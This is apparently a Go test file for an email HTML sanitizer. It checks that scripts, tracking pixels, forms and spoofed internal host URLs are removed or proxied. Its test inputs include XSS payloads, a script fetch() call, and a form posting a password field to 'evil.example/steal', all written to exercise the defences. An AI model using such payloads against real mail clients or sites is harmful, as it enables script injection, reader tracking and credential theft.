package mailhtml

import (
	"net/http"
	"net/http/httptest"
	"regexp"
	"strings"
	"sync/atomic"
	"testing"
)

func sanitize(t *testing.T, raw string, allowRemote bool) Result {
	t.Helper()

	opts := Options{Mode: ModeBlock}
	if allowRemote {
		opts = Options{
			Mode:     ModeProxy,
			ProxyURL: func(token string) string { return "http://wails.localhost/mail-asset/1/" + token },
		}
	}
	res, err := Sanitize(raw, opts)
	if err != nil {
		t.Fatalf("Sanitize() error: %v", err)
	}
	return res
}

func TestScriptsAreRemoved(t *testing.T) {
	cases := []struct {
		name string
		raw  string
	}{
		{"script element", `<p>hi</p><script>window.__xssFired = true</script>`},
		{"inline handler", `<img src="cid:x" onerror="window.__xssFired = true">`},
		{"javascript URL", `<a href="javascript:alert(1)">click</a>`},
		{"iframe", `<iframe src="https://evil.example"></iframe>`},
		{"object", `<object data="https://evil.example"></object>`},
		{"embed", `<embed src="https://evil.example">`},
		{"svg script", `<svg><script>window.__xssFired = true</script></svg>`},
		{"meta refresh", `<meta http-equiv="refresh" content="0;url=https://evil.example">`},
		{"base tag", `<base href="https://evil.example/">`},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := sanitize(t, tc.raw, false).HTML
			for _, forbidden := range []string{"__xssFired", "javascript:", "<script", "<iframe", "<object", "<embed", "<base", "evil.example"} {
				if strings.Contains(got, forbidden) {
					t.Errorf("output %q still contains %q", got, forbidden)
				}
			}
		})
	}
}

func TestScriptRemovalKeepsSurroundingContent(t *testing.T) {
	// Dropping the script must not take the message with it.
	got := sanitize(t, `<p>before</p><script>bad()</script><p>after</p>`, false).HTML
	if !strings.Contains(got, "before") || !strings.Contains(got, "after") {
		t.Errorf("output %q lost content around the script", got)
	}
}

// Each of these is a separate tracker vector. Blocking only img/src is the
// classic mistake: the others still phone home, which is all a tracking pixel
// needs.
func TestRemoteResourceVectorsAreBlocked(t *testing.T) {
	vectors := []struct {
		name string
		raw  string
	}{
		{"img src", `<img src="http://127.0.0.1:9999/tracker.png">`},
		{"img srcset", `<img srcset="http://127.0.0.1:9999/t1.png 1x, http://127.0.0.1:9999/t2.png 2x">`},
		{"background attribute", `<div background="http://127.0.0.1:9999/attr.png">x</div>`},
		{"inline style url()", `<div style="background:url('http://127.0.0.1:9999/css.png')">x</div>`},
		{"style element url()", `<style>.a{background-image:url("http://127.0.0.1:9999/sheet.png")}</style><div class="a">x</div>`},
		{"video poster", `<video poster="http://127.0.0.1:9999/poster.png"></video>`},
		{"protocol-relative url", `<img src="//127.0.0.1:9999/relative.png">`},
		{"lowsrc", `<img lowsrc="http://127.0.0.1:9999/low.png">`},
	}

	for _, tc := range vectors {
		t.Run(tc.name, func(t *testing.T) {
			res := sanitize(t, tc.raw, false)

			// The blocked URL is deliberately kept in a data- attribute so
			// consent can restore it without refetching the message. What
			// matters is that it no longer sits anywhere the browser would
			// act on, so the record is stripped before checking.
			fetchable := stripBlockedRecords(res.HTML)
			if strings.Contains(fetchable, "127.0.0.1:9999") {
				t.Errorf("output %q still points at the tracker from a fetching position", fetchable)
			}
			if res.BlockedRemoteCount == 0 {
				t.Errorf("BlockedRemoteCount = 0 for %s; the user would never be told", tc.name)
			}
		})
	}
}

// stripBlockedRecords removes the data- attributes that hold blocked URLs for
// later restore. They are inert: nothing requests them.
func stripBlockedRecords(s string) string {
	return regexp.MustCompile(`data-nexus-blocked-[a-z-]+="[^"]*"`).ReplaceAllString(s, "")
}

// One assertion covering them together: if no fetching attribute survives, the
// browser has no opportunity to make a request at all.
func TestNoRemoteURLSurvivesInFetchingPositions(t *testing.T) {
	raw := strings.Join([]string{
		`<img src="http://a.example/1.png">`,
		`<img srcset="http://b.example/2.png 1x">`,
		`<div background="http://c.example/3.png">x</div>`,
		`<div style="background:url(http://d.example/4.png)">x</div>`,
		`<style>.e{background:url('http://e.example/5.png')}</style>`,
		`<video poster="http://f.example/6.png"></video>`,
	}, "\n")

	res := sanitize(t, raw, false)

	// Strip the recorded originals before checking: those are inert data
	// attributes, not something the browser will request.
	withoutRecords := stripBlockedRecords(res.HTML)

	if m := regexp.MustCompile(`https?://`).FindString(withoutRecords); m != "" {
		t.Errorf("a fetchable URL survived: %s", withoutRecords)
	}
	if res.BlockedRemoteCount < 6 {
		t.Errorf("BlockedRemoteCount = %d, want at least 6", res.BlockedRemoteCount)
	}
}

// The unit tests above prove no fetchable URL is emitted. This proves the
// consequence: pointed at a real listener, the output produces no requests.
func TestSanitisedOutputMakesNoRequests(t *testing.T) {
	var hits atomic.Int64
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		hits.Add(1)
		w.WriteHeader(http.StatusNoContent)
	}))
	defer srv.Close()

	raw := strings.Join([]string{
		`<script>fetch("` + srv.URL + `/script")</script>`,
		`<img src="` + srv.URL + `/img.png">`,
		`<img srcset="` + srv.URL + `/srcset.png 1x">`,
		`<div background="` + srv.URL + `/attr.png">x</div>`,
		`<div style="background:url('` + srv.URL + `/inline.png')">x</div>`,
		`<style>.p{background-image:url("` + srv.URL + `/sheet.png")}</style>`,
		`<video poster="` + srv.URL + `/poster.png"></video>`,
	}, "\n")

	res := sanitize(t, raw, false)

	// Request every URL still present in a fetching position. There should be
	// none, so the counter must stay at zero.
	withoutRecords := stripBlockedRecords(res.HTML)
	for _, u := range regexp.MustCompile(`https?://[^\s"'<>)]+`).FindAllString(withoutRecords, -1) {
		resp, err := http.Get(u)
		if err == nil {
			_ = resp.Body.Close()
		}
	}

	if got := hits.Load(); got != 0 {
		t.Errorf("the sanitised output caused %d request(s) to the probe server", got)
	}
}

func TestCIDReferencesAreKept(t *testing.T) {
	// cid: points at a part already inside the message, so it is not a network
	// fetch and blocking it would break inline images in legitimate mail.
	got := sanitize(t, `<img src="cid:logo@example.com">`, false).HTML
	if !strings.Contains(got, "cid:logo@example.com") {
		t.Errorf("output %q dropped the inline part reference", got)
	}
}

func TestLinkHrefsAreKept(t *testing.T) {
	// An href is not a fetch; nothing loads until the user clicks. Hiding
	// where a link points would make phishing harder to spot, not easier.
	got := sanitize(t, `<a href="https://example.com/invoice">invoice</a>`, false).HTML
	if !strings.Contains(got, "https://example.com/invoice") {
		t.Errorf("output %q dropped the link target", got)
	}
}

// Consent does not mean "let the renderer fetch it". The image is routed
// through the host, so the sender still learns nothing about the reader — no
// IP address, no Referer, no user agent.
func TestConsentRoutesRemoteContentThroughTheProxy(t *testing.T) {
	res := sanitize(t, `<img src="https://example.com/pic.png">`, true)

	if strings.Contains(res.HTML, "https://example.com/pic.png") {
		t.Errorf("output %q hands the original URL to the renderer", res.HTML)
	}
	if !strings.Contains(res.HTML, "/mail-asset/1/") {
		t.Errorf("output %q does not point at the proxy", res.HTML)
	}
	if res.BlockedRemoteCount != 0 {
		t.Errorf("BlockedRemoteCount = %d with consent given, want 0", res.BlockedRemoteCount)
	}
	if len(res.RemoteURLs) != 1 {
		t.Fatalf("RemoteURLs holds %d entries, want 1", len(res.RemoteURLs))
	}
	for token, original := range res.RemoteURLs {
		if original != "https://example.com/pic.png" {
			t.Errorf("token %s maps to %q", token, original)
		}
		if !strings.Contains(res.HTML, token) {
			t.Errorf("token %s is not referenced by the document", token)
		}
	}
}

func TestProxyModeCoversEveryVector(t *testing.T) {
	raw := strings.Join([]string{
		`<img src="https://a.example/1.png">`,
		`<img srcset="https://b.example/2.png 1x, https://b.example/3.png 2x">`,
		`<div background="https://c.example/4.png">x</div>`,
		`<div style="background:url('https://d.example/5.png')">x</div>`,
		`<style>.e{background:url("https://e.example/6.png")}</style>`,
	}, "\n")

	res := sanitize(t, raw, true)

	// Every remote reference must be represented, or consent would silently
	// drop part of the message.
	if len(res.RemoteURLs) != 6 {
		t.Errorf("RemoteURLs holds %d entries, want 6: %v", len(res.RemoteURLs), res.RemoteURLs)
	}
	for _, host := range []string{"a.example", "b.example", "c.example", "d.example", "e.example"} {
		if strings.Contains(res.HTML, host) {
			t.Errorf("output still names %s; the renderer would contact it directly", host)
		}
	}
}

func TestProxyModeRequiresAProxyFunction(t *testing.T) {
	// Falling back to the original URL here would silently turn consent into a
	// direct fetch, which is the one thing proxying exists to prevent.
	if _, err := Sanitize(`<img src="https://x.example/a.png">`, Options{Mode: ModeProxy}); err == nil {
		t.Error("Sanitize() accepted ModeProxy with no ProxyURL function")
	}
}

func TestBlockedURLIsRecordedForLaterRestore(t *testing.T) {
	// Keeping the original means consent does not require refetching the
	// message from the server.
	got := sanitize(t, `<img src="https://example.com/pic.png">`, false).HTML
	if !strings.Contains(got, blockedPrefix+"src") {
		t.Errorf("output %q did not record the blocked URL", got)
	}
	if !strings.Contains(got, "https://example.com/pic.png") {
		t.Errorf("output %q lost the original URL, so consent could not restore it", got)
	}
}

func TestFormsCannotSubmit(t *testing.T) {
	got := sanitize(t, `<form action="https://evil.example/steal" method="post"><input name="password"></form>`, false).HTML
	if strings.Contains(got, "evil.example") {
		t.Errorf("output %q keeps a form target", got)
	}
}

func TestTableLayoutSurvives(t *testing.T) {
	// Newsletters are built from tables. Stripping them would leave most real
	// mail unreadable, which is a worse outcome than the risk they carry.
	raw := `<table cellpadding="4" bgcolor="#ffffff"><tr><td align="center">cell</td></tr></table>`
	got := sanitize(t, raw, false).HTML

	for _, want := range []string{"<table", "<td", "cell", "bgcolor"} {
		if !strings.Contains(got, want) {
			t.Errorf("output %q lost %q", got, want)
		}
	}
}

func TestRobustness(t *testing.T) {
	cases := map[string]string{
		"empty":            "",
		"whitespace only":  "   \n\t ",
		"malformed markup": `<div><p>unclosed <img src="http://x/y.png"`,
		"plain text":       "just some text",
		"deep nesting":     strings.Repeat("<div>", 60) + "x" + strings.Repeat("</div>", 60),
	}
	for name, raw := range cases {
		t.Run(name, func(t *testing.T) {
			if _, err := Sanitize(raw, Options{Mode: ModeBlock}); err != nil {
				t.Errorf("Sanitize() error: %v", err)
			}
		})
	}
}

func TestTurkishContentSurvives(t *testing.T) {
	got := sanitize(t, `<p>Şubat ayı faturanız ilişiktedir.</p>`, false).HTML
	if !strings.Contains(got, "Şubat ayı faturanız") {
		t.Errorf("output %q mangled the Turkish text", got)
	}
}

// The host scheme is ours to emit, never the message's to ask for. A sender
// writing one could point the iframe at another message's body, or at the
// asset proxy with a token of their choosing.
func TestSenderSuppliedHostSchemeIsDropped(t *testing.T) {
	cases := []string{
		`<img src="wails://mail-body/1">`,
		`<img src="WAILS://mail-asset/1/deadbeef">`,
		`<a href="wails://mail-body/2">read another message</a>`,
		`<div style="background:url('wails://mail-body/3')">x</div>`,
		// The same attack wearing the host the asset server actually uses.
		`<img src="http://wails.localhost/mail-body/4">`,
		`<div style="background:url('https://wails.localhost/mail-body/5')">x</div>`,
	}
	for _, raw := range cases {
		for _, allowRemote := range []bool{false, true} {
			got := sanitize(t, raw, allowRemote).HTML
			if strings.Contains(strings.ToLower(got), "mail-body") {
				t.Errorf("output %q kept a sender-supplied host URL (allowRemote=%v)", got, allowRemote)
			}
		}
	}
}
